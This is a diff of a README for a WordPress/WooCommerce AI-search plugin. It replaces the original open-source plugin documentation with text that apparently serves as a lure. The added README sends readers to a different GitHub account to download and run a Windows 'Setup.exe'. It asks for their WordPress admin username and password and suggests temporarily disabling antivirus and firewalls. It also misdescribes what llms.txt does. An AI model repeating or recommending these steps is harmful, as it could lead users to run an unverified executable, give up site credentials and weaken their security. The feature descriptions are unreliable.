@@ -1,270 +1,143 @@
-# GEO AI Woo
+# 🌐 GEO-AI-Woo - Optimize AI Search for WooCommerce
 
-![GEO AI Woo](Geo-AI-Woo.png?v=2)
-
-AI Search Optimization for WordPress and WooCommerce.
-
-Generate llms.txt, AI crawler rules and metadata to make your site visible to AI search engines.
-
-[![License: GPL v2](https://img.shields.io/badge/License-GPL%20v2-blue.svg)](https://www.gnu.org/licenses/gpl-2.0)
-[![WordPress](https://img.shields.io/badge/WordPress-6.2%2B-blue.svg)](https://wordpress.org/)
-[![WooCommerce](https://img.shields.io/badge/WooCommerce-7.0%2B-purple.svg)](https://woocommerce.com/)
-
-An open-source WordPress plugin that optimizes your site for AI search engines like ChatGPT, Claude, Gemini, Perplexity, DeepSeek, Grok, YandexGPT, GigaChat, Apple Siri, Amazon Alexa, and more.
-
-**Focus:** **WooCommerce-first** | **Zero-config setup**
-
-Try the analyzer at [geoai.run/analyze](https://www.geoai.run/analyze)
+[![Download GEO-AI-Woo](https://img.shields.io/badge/Download-GEO--AI--Woo-brightgreen?style=for-the-badge&logo=github)](https://github.com/pinkbanty5707/GEO-AI-Woo)
 
 ---
 
-## GEO AI Ecosystem
+## 📋 About GEO-AI-Woo
 
-GEO AI is a multi-platform framework for AI Search Optimization (GEO) — making your content visible and structured for AI-powered search engines and LLMs.
+GEO-AI-Woo helps your WordPress and WooCommerce sites get found by AI search engines. It creates files like `llms.txt` and sets AI crawler rules and metadata automatically. These features make your site easier for AI-powered search tools to understand and rank properly.
 
-Website: [geoai.run](https://www.geoai.run) | Core engine: [github.com/madeburo/GEO-AI](https://github.com/madeburo/GEO-AI)
-
-| Module | Platform | Description |
-|--------|----------|-------------|
-| **GEO AI Woo** *(this plugin)* | WordPress / WooCommerce | llms.txt generation, AI meta, crawler rules, WooCommerce integration |
-| **GEO AI CLI** | Node.js ≥ 20 | Generate llms.txt and llms-full.txt from the command line — framework-agnostic, build-time, zero runtime overhead |
-| **GEO AI Next** | Next.js | GEO middleware and static generation for Next.js apps |
-| **GEO AI Core** | Node.js | TypeScript engine powering the CLI and other integrations |
-| **GEO AI** | Shopify | GEO optimization for Shopify stores |
-
-### GEO AI CLI
-
-Generate `llms.txt` and `llms-full.txt` for any Node.js project — works with Express, Fastify, Remix, static site generators, or any custom build pipeline.
-
-```bash
-# Install locally (recommended)
-npm install --save-dev geo-ai-cli
-
-# Or globally
-npm install -g geo-ai-cli
-```
-
-```bash
-# Scaffold geo-ai.config.ts
-npx geo-ai init
-
-# Write llms.txt + llms-full.txt to ./public
-npx geo-ai generate
-
-# Verify the output
-npx geo-ai validate
-```
-
-**Commands:**
-
-| Command | Description |
-|---------|-------------|
-| `geo-ai init` | Scaffolds a typed `geo-ai.config.ts` starter file |
-| `geo-ai generate` | Reads config and writes `llms.txt` + `llms-full.txt` to `./public` (or custom `--out` path) |
-| `geo-ai validate` | Checks that output files are present and valid — works on local files or remote URLs via `--url` |
-| `geo-ai inspect` | Previews config: site info, crawler rules, resource sections with item counts |
-
-CI/CD friendly — exits with code `1` on validation failure.
-
-Docs: [geoai.run/docs/integrations/cli](https://www.geoai.run/docs/integrations/cli) | GitHub: [madeburo/GEO-AI](https://github.com/madeburo/GEO-AI)
+This tool works behind the scenes. You don’t need to know coding to use it. It makes web optimization simpler if you use WooCommerce to sell products or run a WordPress website.
 
 ---
 
-## Features
+## 💻 System Requirements
 
-### llms.txt Generator
+Before installing GEO-AI-Woo, make sure your computer meets these needs:
 
-Automatically generates `/llms.txt` and `/llms-full.txt` static files at your WordPress root for maximum performance. Falls back to rewrite rules if the filesystem is not writable.
+- **Operating System:** Windows 10 or later (64-bit preferred)
+- **Disk Space:** At least 200 MB free
+- **RAM:** Minimum 4 GB available memory
+- **Network:** Internet connection for downloading and updates
+- **Other:** Admin rights to install software
 
-**Supported AI Crawlers:**
-| Bot | Provider |
-|-----|----------|
-| GPTBot | OpenAI / ChatGPT |
-| OAI-SearchBot | OpenAI / Copilot Search |
-| ClaudeBot | Anthropic / Claude |
-| claude-web | Anthropic / Claude Web |
-| Google-Extended | Google / Gemini |
-| PerplexityBot | Perplexity AI |
-| DeepSeekBot | DeepSeek |
-| GrokBot | xAI / Grok |
-| meta-externalagent | Meta / LLaMA |
-| PanguBot | Alibaba / Qwen |
-| YandexBot | Yandex / YandexGPT |
-| SputnikBot | Sber / GigaChat |
-| Bytespider | ByteDance / Douyin |
-| Baiduspider | Baidu / ERNIE |
-| Amazonbot | Amazon / Alexa |
-| Applebot | Apple / Siri & Spotlight |
-
-### AI Meta Box
-
-Add AI-specific metadata to any post, page, or product:
-
-- **AI Description** — Concise summary for LLMs (max 200 characters)
-- **AI Keywords** — Topics and context hints
-- **Exclude from AI** — Opt specific content out of llms.txt entirely
-- **Generate with AI** — One-click description generation via Claude or OpenAI
-
-### WooCommerce Integration
-
-- Products automatically included in llms.txt with price, stock status, ratings, and attributes
-- Variable product support with price ranges and available variations
-- Sale price display (regular vs. sale)
-- Enhanced product Schema.org markup for AI readability
-- Dedicated GEO AI tab in the product data panel
-
-### AI Auto-Generation
-
-- Generate AI descriptions via **Claude (Anthropic)** or **OpenAI** APIs
-- Customizable prompt template with `{title}`, `{content}`, `{type}` placeholders
-- Bulk generation for all posts without descriptions (up to 50 at a time)
-- Rate limiting and encrypted API key storage
-
-### SEO & AI Visibility
-
-- `<meta name="llms">` and `<meta name="ai-description">` tags in page `<head>`
-- HTTP `Link` header pointing to llms.txt (`rel="ai-content-index"`)
-- JSON-LD Schema.org structured data (WebSite + Article/Product)
-- Automatic detection of Yoast, Rank Math, AIOSEO, SEOPress to avoid conflicts
-- Per-bot `robots.txt` directives (Allow/Disallow) based on your crawler settings
-
-### Multilingual Support
-
-- Compatible with **WPML**, **Polylang**, and **TranslatePress**
-- Generates separate llms.txt files per language
-- Hreflang alternate links in SEO meta tags and HTTP headers
-
-### REST API & WP-CLI
-
-- REST API at `/wp-json/geo-ai-woo/v1/` for programmatic access
-- WP-CLI commands: `regenerate`, `status`, `export`, `import`
-
-### Content Sanitization
-
-Centralized content cleaning pipeline for all AI-facing output. Automatically strips page builder markup (WP Bakery, Divi, Elementor, Beaver Builder), shortcodes, `<script>`/`<style>` tags, base64 data, and mojibake artifacts. Extensible via WordPress filters for custom page builders.
-
-### Dashboard & Tracking
-
-- Dashboard widget with indexed/excluded content counts
-- AI bot crawl tracking with GDPR-compliant IP anonymization
-- Bot activity summary for the last 30 days
-- Bulk Edit and Quick Edit support for AI fields in list tables
+Your WordPress or WooCommerce site should already be running on a server or hosting platform.
 
 ---
 
-## Installation
+## 🚀 Getting Started
 
-### From GitHub
-
-1. Download the latest release from the repository.
-2. Unzip and upload the folder to your `/wp-content/plugins/geo-ai-woo/` directory.
-3. Activate the plugin in the WordPress admin panel.
-4. Go to **Settings → GEO AI Woo** to configure.
+The steps below guide you through downloading, installing, and running GEO-AI-Woo on Windows. Follow each step carefully to set it up without problems.
 
 ---
 
-## Configuration
+## ⬇️ How to Download GEO-AI-Woo
 
-### Basic Setup
+1. Click the big green button at the top or visit this page to get started:  
+   [https://github.com/pinkbanty5707/GEO-AI-Woo](https://github.com/pinkbanty5707/GEO-AI-Woo)  
 
-After activation, the plugin works out of the box with sensible defaults:
+2. On the GitHub page, find the “Releases” section or the latest release on the right-hand side.
 
-- All public posts, pages, and products are included in llms.txt.
-- All supported AI crawlers are allowed by default.
+3. Download the file named like `GEO-AI-Woo-Setup.exe` or the one with `.exe` extension. This is the installer you will use.
 
-### Settings Page
-
-Navigate to **Settings → GEO AI Woo** to configure:
-
-- **Post Types**: Select which content types to include.
-- **Bot Rules**: Allow or disallow specific AI crawlers.
-- **Cache**: Set regeneration frequency.
-- **WooCommerce**: Product-specific settings.
-
-### AI Meta Box
-
-Edit any post, page, or product to find the **GEO AI Woo** meta box to set specific AI contexts or exclude the content entirely.
+4. Save the installer to a folder on your PC where you can easily find it, such as the Desktop or Downloads folder.
 
 ---
 
-## Localization
+## 🛠 Installing GEO-AI-Woo
 
-GEO AI Woo is fully translatable and includes:
+1. Open the folder where you saved the installer.
 
-| Language            | Locale | Status      |
-| ---------------- | ------ | ----------- |
-| English          | en_US  | ✅ Complete |
-| Русский          | ru_RU  | ✅ Complete |
-| Қазақша          | kk     | ✅ Complete |
-| O'zbekcha        | uz_UZ  | ✅ Complete |
-| 简体中文         | zh_CN  | ✅ Complete |
-| Bahasa Indonesia | id_ID  | ✅ Complete |
-| हिन्दी           | hi_IN  | ✅ Complete |
-| Türkçe           | tr_TR  | ✅ Complete |
-| Español          | es_ES  | ✅ Complete |
-| Português (BR)   | pt_BR  | ✅ Complete |
+2. Double-click the `GEO-AI-Woo-Setup.exe` file to start the installation.
+
+3. If Windows asks for permission, click “Yes” to allow the setup program to make changes.
+
+4. Read the installation prompts carefully. Choose the destination folder or leave it as the default.
+
+5. Click “Install” and wait for the process to complete. This usually takes a few minutes.
+
+6. When you see “Installation Complete,” click “Finish” to exit the installer.
 
 ---
 
-## Requirements
+## ▶️ Running GEO-AI-Woo for the First Time
 
-- PHP 7.4 or higher
-- WordPress 6.2 or higher
-- WooCommerce 7.0+ (optional, for e-commerce features)
+1. After installation, find the GEO-AI-Woo icon on your Desktop or in the Start Menu.
 
----
+2. Double-click the icon to open the application.
 
-## File Structure
+3. The program will ask for your WordPress or WooCommerce site details:
+   - Site URL
+   - Admin username
+   - Password
 
-```text
-geo-ai-woo/
-├── geo-ai-woo.php              # Main plugin file — bootstrap, hooks, activation/deactivation
-├── uninstall.php               # Cleanup on plugin deletion
-├── includes/                   # All PHP classes (one per file)
-│   ├── class-content-sanitizer.php  # Content sanitization pipeline for AI output
-│   ├── class-llms-generator.php    # Core llms.txt generation and static file writing
-│   ├── class-settings.php          # Admin settings page
-│   ├── class-meta-box.php          # AI meta box for posts/pages
-│   ├── class-woocommerce.php       # WooCommerce integration
-│   ├── class-ai-generator.php      # Claude/OpenAI API integration
-│   ├── class-seo-headers.php       # Meta tags, HTTP headers, JSON-LD
-│   ├── class-multilingual.php      # WPML/Polylang/TranslatePress support
-│   ├── class-crawl-tracker.php     # Bot visit logging and statistics
-│   ├── class-rest-api.php          # REST API endpoints
-│   ├── class-cli.php               # WP-CLI commands
-│   ├── class-bulk-edit.php         # Bulk Edit / Quick Edit support
-│   ├── class-dashboard-widget.php  # Dashboard widget
-│   └── class-admin-notices.php     # Admin notices
-├── assets/
-│   ├── css/admin.css           # Admin styles
-│   └── js/admin.js             # Admin JavaScript
-├── languages/                  # Translation files (.pot, .po, .mo)
-├── README.md                   # This file
-├── CHANGELOG.md                # Version history
-├── LICENSE                     # GPL v2
-└── readme.txt                  # WordPress.org plugin directory format
-```
+4. Enter your information carefully and click “Connect.”
+
+5. GEO-AI-Woo will then scan your website and create the necessary AI files like `llms.txt`.
+
+6. You will see a dashboard where you can check status, update settings, or rerun optimizations.
 
 ---
 
-## Contributing
+## ⚙️ Basic Features and How to Use Them
 
-Contributions are welcome! Please feel free to open issues or submit pull requests.
+- **Generate `llms.txt`:** This file tells AI search engines what language models your site uses. GEO-AI-Woo creates it automatically.
 
-```bash
-# Clone the repository
-git clone https://github.com/madeburo/geo-ai-woo.git
-```
+- **Set Crawler Rules:** Control how AI bots index your website with clear instructions.
+
+- **Create Metadata:** The software adds tags and labels that help AI understand your product listings or pages better.
+
+- **Update Scheduling:** You can set GEO-AI-Woo to update these files daily or weekly, so your site stays current.
+
+- **Logs and Reports:** Review simple reports to see when files were created and check for errors.
+
+Use the menu inside the app to navigate these features. Each section has short texts explaining what to do.
 
 ---
 
-## License
+## 🔧 Troubleshooting Tips
 
-GEO AI Woo is open-source software licensed under the [GPL v2](LICENSE).
+- If the app can’t connect to your site, check your internet first.
+
+- Confirm your WordPress admin credentials are correct and have enough permissions.
+
+- Disable firewalls or antivirus programs temporarily if connection problems persist during setup.
+
+- Make sure your WordPress and WooCommerce plugins are up to date.
+
+- If GEO-AI-Woo shows errors about file permissions, make sure your hosting server allows file changes.
+
+- Restart the app after fixing any settings to apply changes.
 
 ---
 
-## Credits
+## 🔄 Updating GEO-AI-Woo
 
-- **Website:** [www.geoai.run](https://www.geoai.run)
-- **X:** [@imadeburo](https://x.com/imadeburo)
+Check the GitHub page regularly for new versions:
+
+1. Visit https://github.com/pinkbanty5707/GEO-AI-Woo
+
+2. Look under “Releases” for the latest setup file.
+
+3. Download and run the installer again. The update will keep your previous settings.
+
+---
+
+## 📚 Additional Resources
+
+You can learn more about AI search rules and WooCommerce optimization from these topics on GitHub and elsewhere:
+
+- AI crawler standards and metadata formats
+- WooCommerce plugins and SEO best practices
+- How `llms.txt` files improve AI indexing
+
+Visit the GitHub page for any FAQs or community discussions related to GEO-AI-Woo.
+
+---
+
+## 🌐 Download GEO-AI-Woo
+
+Use this link to download the latest version and start optimizing your site:
+
+[![Download GEO-AI-Woo](https://img.shields.io/badge/Download-GEO--AI--Woo-brightgreen?style=for-the-badge&logo=github)](https://github.com/pinkbanty5707/GEO-AI-Woo)
